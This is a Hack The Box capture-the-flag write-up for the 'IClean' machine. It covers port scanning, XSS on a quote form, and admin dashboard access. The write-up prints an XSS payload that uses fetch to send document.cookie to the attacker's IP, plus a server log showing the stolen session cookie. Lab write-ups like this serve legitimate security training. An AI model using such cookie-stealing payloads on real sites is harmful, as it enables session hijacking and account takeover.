---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: deserializationattack scripting bash python node.js cronjob reverseshell
---

<br />

![machine-icon](../../../assets/images/IClean/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Enumeration:

<br />

As always, we'll start by launching our nmap scan:

<br />

```bash
❯ nmap -p- 10.10.11.12 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 15:04 CET
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.11.12
Host is up (0.044s latency).
Not shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.03 seconds
```

<br />

Ports 22 and 80 open, nothing out of the ordinary.

<br />

# Web Enumeration:

<br />

We proceed to list the website, but doing so redirects us to the next domain -> capiclean.htb. 

So we added it to the /etc/hosts to be able to access:

<br />

```bash
❯ echo -n '10.10.11.12 capiclean.htb' | tee -a /etc/hosts
10.10.11.12 capiclean.htb
```

<br />

We relist the website and find a fairly straightforward page and another with a login where we try default credentials like admin:admin but nothing: 

<br />

![2](../../../assets/images/IClean/2.png)
![3](../../../assets/images/IClean/3.png)

<br />

We kept looking and found another page a little more interesting with an user input in the /quote path:

<br />

![4](../../../assets/images/IClean/4.png)

<br />

As always when we have an input, we intercept the request with Burp Suite and start testing different types of vulnerabilities such as SQL Injection, XSS...

<br />

![5](../../../assets/images/IClean/5.png)

<br />

# Exploiting XXS:

<br />

After several tests we are able to receive a request by GET from the server exploiting an XSS:

Payload -> \<img src="http://10.10.14.13/testing.png"\>\</img\>


<br />

![6](../../../assets/images/Celestial/6.png)

<br />

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.12 - - [30/Dec/2024 16:18:07] code 404, message File not found
10.10.11.12 - - [30/Dec/2024 16:18:07] "GET /testing.png HTTP/1.1" 404 -
```

<br />

We have an XSS so to take advantage of it we built a payload with fetch to try to steal the cookies from some admin who is behind the web loading our malicious code:

Payload -> \<img src=x onerror=fetch("http://10.10.14.13/+document.cookie")\>\</img\>


<br />

![6](../../../assets/images/IClean/6.png)

<br />

SURPRISE! We steal a cookies vault!

<br />

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.12 - - [30/Dec/2024 16:25:06] code 404, message File not found
10.10.11.12 - - [30/Dec/2024 16:25:06] "GET /testing.pngsession=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Z3KL3Q.0csXF3KeXH5L4JLYhYqvjWLgfX8 HTTP/1.1" 404 -
```

<br />

We fuzzed the web a bit to see if we could find a path where we could use our new cookies and discovered the /dashboard path.

<br />

```bash
000002927:   302        5 L      22 W       189 Ch      "dashboard"
```

<br />

Once we have discovered this path, we set the cookies and access it, managing to enter what appears to be the website's administration panel:

<br />

![7](../../../assets/images/IClean/7.png)

<br />

![8](../../../assets/images/IClean/8.png)

<br />

# Dashboard Enumeration:

<br />

The panel we have accessed consists of 4 different pages, so we will investigate them 1 by 1 to better understand how the website works and identify any vulnerabilities:

<br />

## Generating An Invoice:

<br />

Access the /InvoiceGenerator path and fill in the data:

<br />

![9](../../../assets/images/IClean/9.png)

<br />

Click on generate and it returns the ID of the generated invoice:

<br />

![10](../../../assets/images/IClean/10.png)

<br />

## Generate A QR:

<br />

We access the /QRGenerator and with the invoice ID we generate a QR Code:

<br />

![11](../../../assets/images/IClean/11.png)

<br />

Click on generate and it returns the QR Code Link:

<br />

![12](../../../assets/images/IClean/12.png)

<br />

We copy the url link and insert it in the section where it tells us to enter it:

<br />

![13](../../../assets/images/IClean/13.png)

<br />
